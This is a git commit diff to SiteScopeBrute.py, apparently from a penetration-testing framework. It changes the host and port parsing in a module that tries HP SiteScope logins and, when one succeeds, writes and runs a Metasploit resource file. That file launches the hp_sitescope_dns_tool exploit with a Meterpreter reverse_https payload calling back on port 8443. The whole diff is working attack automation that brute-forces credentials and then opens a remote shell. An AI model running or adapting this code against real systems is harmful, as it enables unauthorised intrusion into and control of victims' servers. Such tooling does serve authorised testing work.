1f27b4f541a012cc41a3aa729946666e55c72892
Kirk Hayes (l0gan) <kirk.paul.hayes+github@gmail.com>
2016-07-26 23:18:24 -0400

    fix minor issue where ip would not be set if no internet access allowed

--- modules/SiteScopeBrute.py
+++ modules/SiteScopeBrute.py
@@ -15,7 +15,7 @@ class SiteScopeBrute():
             resp1 = c.get(config["HOST"] + '/SiteScope/')
             cookie1 = resp1.cookies['JSESSIONID']
             cookies = dict(JSESSIONID=cookie1)
-            c.headers.update({'Host': config["HOST"] + ':' + config["port"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["HOST"] + '/SiteScope/servlet/Main', 'Accept-Language': 'en-US,en;q=0.5'})
+            c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["HOST"] + '/SiteScope/servlet/Main', 'Accept-Language': 'en-US,en;q=0.5'})
             c.cookies.clear()
             cpost = c.post(config["HOST"] + '/SiteScope/j_security_check', cookies=cookies, data=payload, allow_redirects=True)
             m = re.search("Incorrect user name or password", cpost.text)
@@ -23,20 +23,24 @@ class SiteScopeBrute():
                 print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
             else:
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"] + ". Running Metasploit module now...")
+                host = config["HOST"].split(":")[1]
+                host = host.split("/")[2]
+                port = config["HOST"].split(":")[2]
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.connect(("gmail.com",80))
+                s.connect((host,int(port)))
                 locIP = s.getsockname()[0]
                 s.close()
                 msfrf = open('msfresource.rc', 'w')
                 msfrf.write('use exploit/windows/http/hp_sitescope_dns_tool\n')
-                msfrf.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
-                msfrf.write('set RHOST ' + config["HOST"] + '\n')
-                msfrf.write('set RPORT ' + config["port"] + '\n')
+                msfrf.write('set PAYLOAD windows/meterpreter/reverse_https\n')
+                msfrf.write('set RHOST ' + host + '\n')
+                msfrf.write('set RPORT ' + port + '\n')
                 msfrf.write('set SITE_SCOPE_USER ' + config["USERNAME"] + '\n')
                 msfrf.write('set SITE_SCOPE_PASSWORD ' + config["PASSWORD"] + '\n')
                 msfrf.write('set LHOST ' + locIP + '\n')
+                msfrf.write('set LPORT 8443\n')
                 msfrf.write('set ExitOnSession false\n')
-                msfrf.write('exploit -j -z\n')
+                msfrf.write('exploit\n')
                 msfrf.close()
                 os.system("msfconsole -r msfresource.rc")
                 os.system("rm msfresource.rc")
